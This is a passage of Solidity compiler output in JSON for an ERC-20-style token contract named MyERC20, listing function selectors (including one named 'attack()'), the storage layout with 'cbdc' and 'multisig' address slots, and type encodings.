					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"attack()": "9e5faafc",
					"balanceOf(address)": "70a08231",
					"decimals()": "313ce567",
					"decreaseAllowance(address,uint256)": "a457c2d7",
					"increaseAllowance(address,uint256)": "39509351",
					"name()": "06fdde03",
					"symbol()": "95d89b41",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 15,
						"contract": "contracts/PriceUpdater.sol:MyERC20",
						"label": "_balances",
						"offset": 0,
						"slot": "0",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 21,
						"contract": "contracts/PriceUpdater.sol:MyERC20",
						"label": "_allowances",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 23,
						"contract": "contracts/PriceUpdater.sol:MyERC20",
						"label": "_totalSupply",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 25,
						"contract": "contracts/PriceUpdater.sol:MyERC20",
						"label": "_name",
						"offset": 0,
						"slot": "3",
						"type": "t_string_storage"
					},
					{
						"astId": 27,
						"contract": "contracts/PriceUpdater.sol:MyERC20",
						"label": "_symbol",
						"offset": 0,
						"slot": "4",
						"type": "t_string_storage"
					},
					{
						"astId": 748,
						"contract": "contracts/PriceUpdater.sol:MyERC20",
						"label": "cbdc",
						"offset": 0,
						"slot": "5",
						"type": "t_address"
					},
					{
						"astId": 751,
						"contract": "contracts/PriceUpdater.sol:MyERC20",
						"label": "multisig",
						"offset": 0,
						"slot": "6",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}